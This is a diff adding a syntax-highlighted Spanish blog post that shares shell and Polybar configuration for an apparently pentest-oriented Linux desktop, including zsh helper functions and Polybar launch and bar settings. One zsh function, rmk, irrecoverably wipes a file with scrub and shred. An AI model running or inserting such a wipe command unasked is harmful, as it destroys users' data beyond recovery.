+	&lt;span class=&quot;nv&quot;&gt;ip_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] Extracting information...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; extractPorts.tmp
+	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] IP Address: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ip_address&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; extractPorts.tmp
+	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] Open ports: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ports&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; extractPorts.tmp
+	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ports&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\n'&lt;/span&gt; | xclip &lt;span class=&quot;nt&quot;&gt;-sel&lt;/span&gt; clip
+	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] Ports copied to clipboard&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; extractPorts.tmp
+	&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;extractPorts.tmp&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;extractPorts.tmp
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Set 'man' colors&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;man&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;env&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;LESS_TERMCAP_mb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;$'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;[01;31m'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;LESS_TERMCAP_md&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;$'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;[01;31m'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;LESS_TERMCAP_me&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;$'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;[0m'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;LESS_TERMCAP_se&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;$'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;[0m'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;LESS_TERMCAP_so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;$'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;[01;44;33m'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;LESS_TERMCAP_ue&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;$'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;[0m'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;LESS_TERMCAP_us&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;$'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;[01;32m'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    man &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# fzf improvement&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;fzf-lovely&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;h&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+		&lt;/span&gt;fzf &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--reverse&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--preview-window&lt;/span&gt; down:20 &lt;span class=&quot;nt&quot;&gt;--preview&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[[ $(file --mime {}) =~ binary ]] &amp;amp;&amp;amp;
+ 	                echo {} is a binary file ||
+	                 (bat --style=numbers --color=always {} ||
+	                  highlight -O ansi -l {} ||
+	                  coderay {} ||
+	                  rougify {} ||
+	                  cat {}) 2&amp;gt; /dev/null | head -500'&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;else
+	        &lt;/span&gt;fzf &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--preview&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[[ $(file --mime {}) =~ binary ]] &amp;amp;&amp;amp;
+	                         echo {} is a binary file ||
+	                         (bat --style=numbers --color=always {} ||
+	                          highlight -O ansi -l {} ||
+	                          coderay {} ||
+	                          rougify {} ||
+	                          cat {}) 2&amp;gt; /dev/null | head -500'&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;rmk&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
+	scrub &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; dod &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;shred&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-zun&lt;/span&gt; 10 &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Finalize Powerlevel10k instant prompt. Should stay at the bottom of ~/.zshrc.&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;+functions[p10k-instant-prompt-finalize]&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; p10k-instant-prompt-finalize
+
+&lt;span class=&quot;c&quot;&gt;# Install Ruby Gems to ~/gems&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;GEM_HOME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;~/.ruby/
+&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:~/.ruby/bin&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;archivo-launchsh&quot;&gt;Archivo launch.sh&lt;/h2&gt;
+
+&lt;p&gt;Este sería el archivo de configuración situado bajo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.config/polybar&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Terminate already running bar instances&lt;/span&gt;
+killall &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; polybar
+
+&lt;span class=&quot;c&quot;&gt;# Wait until the processes have been shut down&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;pgrep &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$UID&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; polybar &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Launch bar1 and bar2&lt;/span&gt;
+polybar example &amp;amp;
+
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Polybar launched...&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;El archivo de configuración del &lt;strong&gt;Polybar&lt;/strong&gt; no es necesario que lo comparta por aquí porque básicamente son 2 líneas las que hay que cambiar y no debería de dar fallos. bueno va voy a ponerlo ya que no me cuesta nada.&lt;/p&gt;
+
+&lt;h2 id=&quot;archivo-config&quot;&gt;Archivo config&lt;/h2&gt;
+&lt;p&gt;Este sería el archivo de configuración situado bajo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.config/polybar&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==========================================================&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   ██████╗  ██████╗ ██╗  ██╗   ██╗██████╗  █████╗ ██████╗
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   ██╔══██╗██╔═══██╗██║  ╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   ██████╔╝██║   ██║██║   ╚████╔╝ ██████╔╝███████║██████╔╝
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   ██╔═══╝ ██║   ██║██║    ╚██╔╝  ██╔══██╗██╔══██║██╔══██╗
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   ██║     ╚██████╔╝███████╗██║   ██████╔╝██║  ██║██║  ██║
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   ╚═╝      ╚═════╝ ╚══════╝╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   To learn more about how to configure Polybar
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   go to https://github.com/polybar/polybar
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   The README contains a lot of information
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==========================================================&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;colors]
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;xrdb&lt;/span&gt;:color0:#222&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+background &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#aa2F343F&lt;/span&gt;
+background-alt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#444&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;xrdb&lt;/span&gt;:color7:#222&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#dfdfdf&lt;/span&gt;
+foreground-alt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#555&lt;/span&gt;
+primary &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#ffb52a&lt;/span&gt;
+secondary &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#e60053&lt;/span&gt;
+alert &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#bd2c40&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;bar/example]
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;monitor &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;env&lt;/span&gt;:MONITOR:HDMI-1&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+width &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 100%
+height &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 27
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;offset-x &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1%
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;offset-y &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1%
+radius &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 6.0
+fixed-center &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false
+
+&lt;/span&gt;background &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.background&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+line-size &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 3
+line-color &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#f00&lt;/span&gt;
+
+border-size &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 4
+border-color &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#00000000&lt;/span&gt;
+
+padding-left &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+padding-right &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+
+module-margin-left &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
+module-margin-right &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+
+font-0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; fixed:pixelsize&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;1
+font-1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; unifont:fontformat&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;truetype:size&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8:antialias&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;0
+font-2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; siji:pixelsize&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;1
+font-3 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Hack Nerd Font Mono:pixelsize&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;2
+
+modules-left &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; bspwm i3
+modules-center &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; xwindow
+modules-right &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; pulseaudio memory wlanpolybar vpn wlan eth battery &lt;span class=&quot;nb&quot;&gt;date
+
+&lt;/span&gt;tray-position &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; right
+tray-padding &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;tray-background &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#0063ff&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;wm-restack &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; bspwm
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;wm-restack &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; i3
+
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;override-redirect &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;scroll-up &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; bspwm-desknext
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;scroll-down &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; bspwm-deskprev
+
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;scroll-up &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; i3wm-wsnext
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;scroll-down &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; i3wm-wsprev
+
+cursor-click &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; pointer
+cursor-scroll &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ns-resize
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/xwindow]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; internal/xwindow
+label &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %title:0:30:...%
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/xkeyboard]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; internal/xkeyboard
+blacklist-0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; num lock
+
+format-prefix &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt;
+format-prefix-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+format-prefix-underline &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.secondary&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+label-layout &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %layout%
+label-layout-underline &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.secondary&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+label-indicator-padding &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+label-indicator-margin &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
+label-indicator-background &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.secondary&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+label-indicator-underline &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.secondary&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/filesystem]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; internal/fs
+interval &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 25
+
+mount-0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; /
+
+label-mounted &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;F#0a81f5&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;%mountpoint%%&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;F-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;: %percentage_used%%
+label-unmounted &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %mountpoint% not mounted
+label-unmounted-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/bspwm]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; internal/bspwm
+
+label-focused &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+label-focused-background &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.background-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#label-focused-underline= ${colors.primary}&lt;/span&gt;
+label-focused-padding &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+
+label-occupied &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+label-occupied-padding &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+
+label-urgent &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+label-urgent-background &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.alert&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+label-urgent-padding &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+
+label-empty &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+label-empty-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+label-empty-padding &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+
